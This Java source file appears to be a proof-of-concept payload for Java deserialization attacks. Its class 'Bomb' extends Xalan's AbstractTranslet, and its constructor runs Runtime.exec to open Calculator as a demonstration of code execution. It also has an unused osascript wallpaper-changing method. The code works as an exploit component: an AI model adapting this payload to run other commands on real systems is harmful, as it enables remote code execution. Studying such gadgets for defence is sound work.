import org.apache.xalan.xsltc.DOM;
import org.apache.xalan.xsltc.TransletException;
import org.apache.xml.dtm.DTMAxisIterator;
import org.apache.xml.serializer.SerializationHandler;

import java.io.File;
import java.util.*;
import java.io.*;

public class Bomb extends org.apache.xalan.xsltc.runtime.AbstractTranslet {

    public Bomb() {
        super.transletVersion = CURRENT_TRANSLET_VERSION;
        try {
            //Now we can do evil stuff
            Runtime rt = Runtime.getRuntime();
            String[] cmdline = {"open", "-a", "/System/Applications/Calculator.app/Contents/MacOS/Calculator"};
            rt.exec(cmdline);
            System.out.println("BOOOOOOOOM!");
        }catch(Throwable t){
            t.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
        // empty
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
        // empty
    }

    public void setWallpaper(File file)
            throws Exception {
        String as[] = {
                "osascript",
                "-e", "tell application \"Finder\"",
                "-e", "set desktop picture to POSIX file \"" + file.getAbsolutePath() + "\"",
                "-e", "end tell"
        };
        Runtime runtime = Runtime.getRuntime();
        Process process;
        process = runtime.exec(as);
    }
}